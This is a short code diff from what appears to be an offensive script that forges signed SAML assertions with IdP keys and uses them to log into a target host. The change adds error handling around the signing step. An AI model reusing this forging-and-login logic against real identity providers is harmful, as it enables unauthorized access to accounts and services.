@@ -382,7 +382,10 @@ ywn2KYen0leh9jHsJBtoLXs0s95wNkmHm4kGbI5SjwM=
     req = saml_request(argstarget)
     t = fill_template(hostname, argstarget, domain,req)
     for idp_cert in idp_certs:
-        s = sign_assertion(t, trusted_cert_1, trusted_cert_2, idp_cert)
+        try:
+            s = sign_assertion(t, trusted_cert_1, trusted_cert_2, idp_cert)
+        except:
+            print(f'[-] Private key not working')
     if s:
         c = login(argstarget, s)
     else:
